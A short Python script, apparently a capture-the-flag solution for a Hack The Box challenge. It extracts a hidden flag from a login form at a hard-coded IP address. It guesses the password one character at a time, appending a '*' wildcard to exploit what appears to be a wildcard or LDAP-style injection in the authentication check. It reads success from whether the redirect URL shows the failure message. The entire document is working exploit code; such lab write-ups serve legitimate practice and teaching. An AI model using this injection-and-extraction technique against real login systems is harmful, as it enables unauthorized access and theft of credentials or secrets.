import requests
import string

headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
url = "http://206.189.124.56:30610/login"

chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

counter = 0
flag = "HTB{"

while True:
    # if all chars are not correct means we previous already found the flag
    if counter == len(chars):
        print(flag + "}")
        break

    # creates something like HTB{a*}
    password = flag + chars[counter] + "*}"
    print("Trying: " + password)

    data = {"username" : "Reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)
    
    if (response.url != url + "?message=Authentication%20failed"):
        # possible flag since we still using * at the end: e.g HTB{abc_*}.
        # append chars[] so that we not need to deal with removing "*}" as compared to if we assign password variable to flag variable
        flag += chars[counter]
        counter = 0
    else:
        # increment the char since we might not have found the right letter
        counter += 1
